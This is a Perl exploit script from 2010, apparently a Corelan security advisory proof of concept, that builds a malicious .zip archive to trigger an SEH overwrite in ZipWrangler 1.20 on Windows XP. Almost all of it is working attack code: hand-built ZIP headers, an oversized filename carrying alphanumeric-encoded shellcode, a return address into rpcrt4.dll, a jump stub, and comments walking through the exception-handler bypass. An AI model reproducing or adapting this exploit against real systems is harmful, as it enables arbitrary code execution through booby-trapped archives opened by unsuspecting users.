#!/usr/bin/perl
# Title:                ZipWrangler 1.20 (.zip) SEH 0day exploit
# Author:               TecR0c & Sud0
# Date:                 April 24th, 2010
# Corelan Reference:    http://www.corelan.be:8800/advisories.php?id=CORELAN-10-031
# Download:             http://www.softpedia.com/get/Compression-tools/ZipWrangler.shtml
# Platform:             Windows XP sp3 En (VMWARE)
# Greetz to:            Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes.
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.

print "|-------------------------------------------------------------------|\n";
print "|                         __               __                       |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___   |\n";
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \  |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / /  |\n";
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/   |\n";
print "|                                                                   |\n";
print "|                                       http://www.corelan.be:8800  |\n";
print "|                                              security@corelan.be  |\n";
print "|                                                                   |\n";
print "|-------------------------------------------------[ EIP Hunters ]---|\n";
print "  [+] ZipWrangler 1.2 (.zip) SEH exploit\n";



my $ldf_header = "\x50\x4B\x03\x04". # local signature
"\x14\x00". # version minimum needed to extract
"\x00\x00". #general purpose bit flag
"\x00\x00". #compression method
"\xB7\xAC". #file last modification time
"\xCE\x34". # file last modification date
"\x00\x00\x00\x00". #CRC32
"\x00\x00\x00\x00". #Compressed size
"\x00\x00\x00\x00" . #Uncompressed Size
"\x48\x10" .# filename length E4 0F
"\x00\x00"; #Extra filed length


my $cdf_header = "\x50\x4B\x01\x02". #Signature
"\x14\x00".#version made by
"\x14\x00".#version needed to extract
"\x00\x00".#general purpose bit flag
"\x00\x00".#Compression method
"\xB7\xAC".#File last modification time
"\xCE\x34".#File last modification date
"\x00\x00\x00\x00". #CRC32
"\x00\x00\x00\x00".#Compressed Size
"\x00\x00\x00\x00".#Uncompressed Size#
"\x48\x10". # filename length
"\x00\x00". #Extra Field Length
"\x00\x00". #File comment length
"\x00\x00". #Disk number where File starts
"\x01\x00". #Internal File Attributes
"\x24\x00\x00\x00". #External File Attributes
"\x00\x00\x00\x00"; #Relative offset of local file header;

my $eofcdf_header = "\x50\x4B\x05\x06". #End of central Directory Signature
"\x00\x00". #Number of this disk
"\x00\x00". #Disk where central directory starts
"\x01\x00". #Number of central directory records on this Disk
"\x01\x00". #Total Number of central directory records
"\x76\x10\x00\x00". #Size of central directory (bytes) (central directory header size + payload)
"\x66\x10\x00\x00". # Offset of start of central directory, relative to start archive  (lfh + payload)
"\x00\x00"; #Zip file Comment length;

#  mov edx, ds :[EAX] ---> the address 0x7FFDFD0C = 00000 in DS
#  so EDX=0000, next instruction TEST EDX,EDX  / Jz xxxxxx (will bypass the error due to mov ECX, ds:[edx])
#  the jump will take us to a retn (so we are out from handler routine) --> come back to execution
#  0x77E9025B [rpcrt4.dll] will overwrite EIP after being back from exception
#  bingo , after \xEB\x06 we are in our \xcc
# shell = message box eax e

my $shell="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8" .
"ABuJIn9JKmK9IT4tdl4tqzrmbpzUaIYcTNkpqfPlKD66lNkpvwlLKsvgx" .
"lKsNepNkEf4xpO4XPul3qIs1KaKOKQapLK2LgT14lKsuUlNkpTgurX6aZ" .
"JLK1ZwhLKCjepUQzKm3p7W9LKp4nkwqzNp1kOvQKpKLLlmTo0BTTJZahO4" .
"MuQKwxihqKOKOIoWKQlQ4Ux2UyNNkcjq4uQJKsVNk6lpKnkrzuL5QXkLKV" .
"dNkWqM8K9qT5tglE1XC82C8EyYDNi8eMY9RCXlNpN4NhlbryxMLKOKOKOl" .
"IqUfdOKQnN8YrPsMW7lddV2KXlKIoyoKOoycueXQxplPlEpkO3XP3VRfNu" .
"4qxpupscUcBK8qLutWzOyIvpVyoaEETMYO2pPMkoXY22mOLOwwlWTf2kXa" .
"NKOYokOSXPlpapnV83XQsbOT255P1kkoxaLQ4TGniKSBHQtShWPUpax0op" .
"iCD55PhpeqhRPbLUaJiNh2lEteYOykQdqKbSbQCv12rKOXP6QO0pPKOSeV" .
"h5ZA";

my $shellcode="A" x 2 . $shell . "A" x (4080-2-length($shell)) . "\x0C\xFD\xFD\x7F" . "\x90" x 4 . "\x5b\x02\xe9\x77" . "\x90" x 8 . "\x83\xC0\x16\xFF\xE0"."\xcc" x 59;
my $filename="wrangler.zip";

my $payload = $shellcode . ".txt";

print "Size : " . length($payload)."\n";
print "Removing old $filename file\n";
system("del $filename");
print "Creating new $filename file\n";
open(FILE, ">$filename");

print FILE $ldf_header . $payload . $cdf_header . $payload . $eofcdf_header;
close(FILE);